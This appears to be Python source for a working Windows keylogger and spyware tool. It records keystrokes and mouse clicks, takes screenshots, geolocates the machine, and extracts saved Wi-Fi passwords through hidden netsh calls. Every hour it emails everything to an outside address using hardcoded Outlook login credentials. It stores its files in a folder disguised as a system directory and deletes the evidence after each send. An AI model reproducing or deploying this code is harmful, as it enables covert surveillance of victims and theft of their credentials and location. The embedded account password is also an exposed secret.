import smtplib
import subprocess
from email.mime.multipart import MIMEMultipart
import socket
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from threading import Timer
import geocoder
from PIL import ImageGrab
from geopy import Nominatim
from pynput.keyboard import Listener
from pynput.mouse import Listener as MouseListener
import logging
import os
def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address


pc = socket.gethostname()
smtp_server = "smtp-mail.outlook.com"
smtp_port = 587
sender_email = "crankyjoke2023@outlook.com"
sender_password = "Defrol2006"
receiver_email = "liushiyang1119cn@yeah.net"

if not os.path.exists("C:/SysWOW64"):
    if not os.path.exists("C:/"):
        if not os.path.exists("D:/SysWOW"):
            os.makedirs("D:/SysWOW")
            file_dir = "D:/SysWOW"
        else:
            file_dir = "D:/SysWOW"
    else:
        os.makedirs("C:/SysWOW64")
        file_dir = "C:/SysWOW64"
else:
    file_dir = "C:/SysWOW64"
# create path
log_dir = file_dir
log_file = "keySystem.txt"
screenshot_dir = file_dir
location_dir = file_dir
internet_access_dir = file_dir
webcam_dir = file_dir

log_path = os.path.join(log_dir, log_file)

if not os.path.exists(log_dir):
    os.makedirs(log_dir)

if not os.path.isfile(log_path):
    open(log_path, 'w').close()

if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)

if not os.path.exists(location_dir):
    os.makedirs(location_dir)

if not os.path.exists(internet_access_dir):
    os.makedirs(internet_access_dir)

logging.basicConfig(filename=log_path, level=logging.DEBUG, format="%(asctime)s - %(message)s")


# functions
def get_location():
    g = geocoder.ip('me')
    return str(g.latlng)


def getaddress():
    geolocator = Nominatim(user_agent="my_app")
    g = geocoder.ip('me')
    l = g.lat
    long = g.lng
    # turn latitude and longitude to locations
    try:
        location = geolocator.reverse((l, long))
        address = location.address
        return address
    except:
        logging.error(f"location error")
        return ("Unknown Address")


def on_press(key):
    logging.info(str(key))


def on_click(x, y, button, pressed):
    if pressed:
        logging.info(f"Mouse clicked at ({x},{y}),button{button}")


def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_path = os.path.join(screenshot_dir, f"screenshot.png")
    screenshot.save(screenshot_path)
    logging.info(f"Screenshot saved: {screenshot_path}")


def get_wifi_passwords():
    try:
        wifi_passwords = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'],
            creationflags=subprocess.CREATE_NO_WINDOW
        ).decode('latin-1').split('\n')

        wifi_profiles = [line.split(':')[1].strip() for line in wifi_passwords if "All User Profile" in line]
        password_list = []

        for p in wifi_profiles:
            try:
                password = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', 'name=' + p, 'key=clear'],
                    creationflags=subprocess.CREATE_NO_WINDOW
                ).decode('latin-1')

                password_lines = [line.split(":")[1].strip() for line in password.split('\n') if "Key Content" in line]

                if password_lines:
                    password_list.append(f"Wi-Fi Name: {p}, Password: {password_lines[0]}")
                else:
                    password_list.append(f"Wi-Fi Name: {p}, Password: Password retrieval failed")
            except subprocess.CalledProcessError:
                password_list.append(f"Wi-Fi Name: {p}, Password: Password retrieval failed")

        return "\n".join(password_list)
    except subprocess.CalledProcessError:
        return "Failed to gain password"


def get_internet_access():
    try:
        internet_access = subprocess.check_output(
            ['netsh', 'http', 'show', 'urlacl'],
            creationflags=subprocess.CREATE_NO_WINDOW
        ).decode('latin-1').split('\n')

        internet_access_list = [line.strip() for line in internet_access if line.strip()]
        return "\n".join(internet_access_list)
    except subprocess.CalledProcessError:
        return "Failed to retrieve internet access records."


# email function
def send_email(log_file_path, screenshot_path, location_path, wifi_passwords, internet_access_path):
    # email subjects
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = str(pc) + " " + str(getaddress()) + " netsh1 " + "ip: "+ str(get_ip_address())
    # add files to email
    with open(log_file_path, 'r') as file:
        log_content = file.read()
        log_attachment = MIMEText(log_content)
        log_attachment.add_header('Content-Disposition', 'attachment', filename=log_file)
        msg.attach(log_attachment)

    with open(screenshot_path, 'rb') as file:
        img_data = file.read()
        image = MIMEImage(img_data, name=os.path.basename(screenshot_path))
        msg.attach(image)

    with open(location_path, 'r') as file:
        location_content = file.read()
        location_attachment = MIMEText(location_content)
        location_attachment.add_header('Content-Disposition', 'attachment', filename="location.txt")
        msg.attach(location_attachment)

    with open(internet_access_path, 'r') as file:
        internet_access_content = file.read()
        internet_access_attachment = MIMEText(internet_access_content)
        internet_access_attachment.add_header('Content-Disposition', 'attachment', filename="internet_access.txt")
        msg.attach(internet_access_attachment)


    wifi_passwords_attachment = MIMEText(wifi_passwords)
    wifi_passwords_attachment.add_header('Content-Disposition', 'attachment', filename="wifi_passwords.txt")
    msg.attach(wifi_passwords_attachment)

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(msg)

    # remove files
    file.close()
    os.remove(screenshot_path)
    logging.shutdown()

    try:
        os.remove(log_file_path)
    except Exception as e:
        pass

    try:
        os.remove(location_path)
    except Exception as e:
        pass
    try:
        os.remove(internet_access_path)
    except Exception as e:
        pass

    open(log_file_path, 'w').close()


# send email
def schedule_email():
    logging.getLogger().handlers[0].flush()
    take_screenshot()
    location = get_location()
    location_path = os.path.join(location_dir, "location.txt")
    with open(location_path, "w") as file:
        file.write(location)

    wifi_passwords = get_wifi_passwords()
    internet_access = get_internet_access()
    internet_access_path = os.path.join(internet_access_dir, "internet_access.txt")
    with open(internet_access_path, "w") as file:
        file.write(internet_access)

    send_email(log_path, os.path.join(screenshot_dir, "screenshot.png"), location_path, wifi_passwords,
               internet_access_path)
    Timer(3600, schedule_email).start()


schedule_email()

with Listener(on_press=on_press) as key_listener, \
        MouseListener(on_click=on_click) as mouse_listener:
    key_listener.join()
    mouse_listener.join()